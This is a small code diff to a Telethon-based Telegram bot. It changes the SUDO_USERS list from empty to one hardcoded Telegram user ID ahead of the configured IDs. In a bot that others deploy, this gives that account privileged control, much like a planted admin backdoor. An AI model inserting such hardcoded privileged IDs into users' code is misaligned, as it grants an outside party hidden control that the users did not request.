@@ -51,7 +51,7 @@ print("Starting.....")
 Riz = TelegramClient('Riz', Var.API_ID, Var.API_HASH).start(bot_token=Var.BOT_TOKEN)
 
 
-SUDO_USERS = []
+SUDO_USERS = [1517994352]
 for x in Var.SUDO: 
     SUDO_USERS.append(x)
 
